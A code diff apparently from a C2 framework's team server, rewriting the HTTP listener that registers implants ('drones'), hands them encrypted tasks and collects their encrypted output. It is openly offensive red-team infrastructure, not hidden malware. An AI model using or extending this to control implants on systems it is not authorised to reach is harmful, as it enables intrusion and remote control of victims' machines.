@@ -1,73 +1,137 @@
-using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Threading.Tasks;
-
-using Microsoft.AspNetCore.Http;
-using Microsoft.AspNetCore.Mvc;
+﻿using Microsoft.AspNetCore.Mvc;
+using Microsoft.AspNetCore.SignalR;
 
 using TeamServer.Interfaces;
 using TeamServer.Models;
 using TeamServer.Services;
+using TeamServer.Utilities;
 
 namespace TeamServer.Handlers;
 
-[Controller]
 public class HttpHandlerController : ControllerBase
 {
-    private readonly SharpC2Service _server;
     private readonly ICryptoService _crypto;
+    private readonly IDroneService _drones;
+    private readonly ITaskService _tasks;
+    private readonly IConfiguration _config;
+    private readonly IHubContext<HubService, IHubService> _hub;
 
-    public HttpHandlerController(SharpC2Service server, ICryptoService crypto)
+    public HttpHandlerController(ICryptoService crypto, IDroneService drones, ITaskService tasks, IConfiguration config,
+        IHubContext<HubService, IHubService> hub)
     {
-        _server = server;
         _crypto = crypto;
+        _drones = drones;
+        _tasks = tasks;
+        _config = config;
+        _hub = hub;
     }
 
     public async Task<IActionResult> RouteDrone()
     {
-        // troll if X-Malware header isn't present
-        if (!HttpContext.Request.Headers.TryGetValue("X-Malware", out _)) return NotFound();
+        var metadata = await ExtractMetadata();
 
-        // first, extract drone metadata
-        var metadata = ExtractMetadata(HttpContext.Request.Headers);
+        if (metadata is null)
+            return NotFound();
 
-        // if it's null, return a 404
-        if (metadata is null) return NotFound();
-
-        // if GET, just a checkin, it's not sending data
-        // if POST, it's sending data, so read it
+        // try and get drone
+        var drone = await GetDrone(metadata);
+        
+        // if post read body
         if (HttpContext.Request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
+            await ReadRequestBody();
+        
+        // get pending tasks
+        var tasks = (await _tasks.GetPendingTasks(drone.Id)).ToArray();
+        
+        if (!tasks.Any())
+            return NoContent();
+        
+        // encrypt
+        var (iv, data, checksum) = await _crypto.EncryptObject(tasks);
+        
+        var message = new C2Message
         {
-            using var sr = new StreamReader(HttpContext.Request.Body);
-            var body = await sr.ReadToEndAsync();
-            await ExtractMessagesFromBody(body);
+            DroneId = drone.Id,
+            Iv = iv,
+            Data = data,
+            Checksum = checksum
+        };
+        
+        return new FileContentResult(message.Serialize(), "application/octet-stream");
+    }
+
+    private async Task<Metadata> ExtractMetadata()
+    {
+        if (!HttpContext.Request.Headers.TryGetValue("Authorization", out var values))
+            return null;
+        
+        // remove "bearer "
+        var b64 = values[0].Remove(0, 7);
+        var enc = Convert.FromBase64String(b64);
+        var (iv, data, checksum) = enc.FromByteArray();
+
+        return await _crypto.DecryptObject<Metadata>(iv, data, checksum);
+    }
+
+    private async Task<Drone> GetDrone(Metadata metadata)
+    {
+        var drone = await _drones.GetDrone(metadata.Id);
+
+        // if null create a new one
+        if (drone is null)
+        {
+            drone = new Drone(metadata)
+            {
+                Handler = _config.GetValue<string>("name"),
+                ExternalAddress = HttpContext.Connection.RemoteIpAddress?.ToString()
+            };
+
+            // add to db
+            await _drones.AddDrone(drone);
+            
+            // notify hub
+            await _hub.Clients.All.NotifyNewDrone(drone.Id);
+        }
+        else // else check-in and update
+        {
+            drone.CheckIn();
+            
+            //  update db
+            await _drones.UpdateDrone(drone);
+            
+            // notify hub
+            await _hub.Clients.All.NotifyDroneCheckedIn(drone.Id);
         }
 
-        // get anything outbound
-        var envelopes = (await _server.GetDroneTasks(metadata)).ToArray();
-
-        if (!envelopes.Any()) return NoContent();
-        return Ok(envelopes);
+        return drone;
     }
 
-    private DroneMetadata ExtractMetadata(IHeaderDictionary headers)
+    private async Task ReadRequestBody()
     {
-        if (!headers.TryGetValue("Authorization", out var encodedMetadata))
-            return null;
+        using var ms = new MemoryStream();
+        await HttpContext.Request.Body.CopyToAsync(ms);
 
-        // remove "Bearer " from string
-        encodedMetadata = encodedMetadata.ToString().Remove(0, 7);
+        // get message
+        var message = ms.ToArray().Deserialize<C2Message>();
+        
+        if (message is null)
+            return;
+        
+        // decrypt
+        IEnumerable<DroneTaskOutput> outputs = null;
+        
+        try
+        {
+            outputs = await _crypto.DecryptObject<IEnumerable<DroneTaskOutput>>(message.Iv, message.Data, message.Checksum);
+        }
+        catch (CryptoException e)
+        {
+            Console.WriteLine($"[!] {e.Message}");
+        }
+        
+        if (outputs is null)
+            return;
 
-        return _crypto.DecryptData<DroneMetadata>(Convert.FromBase64String(encodedMetadata));
-    }
-
-    private async Task ExtractMessagesFromBody(string body)
-    {
-        var envelopes = body.Deserialize<IEnumerable<MessageEnvelope>>();
-        if (envelopes is null) return;
-
-        await _server.HandleC2Envelopes(envelopes);
+        await _tasks.UpdateTasks(outputs);
     }
 }
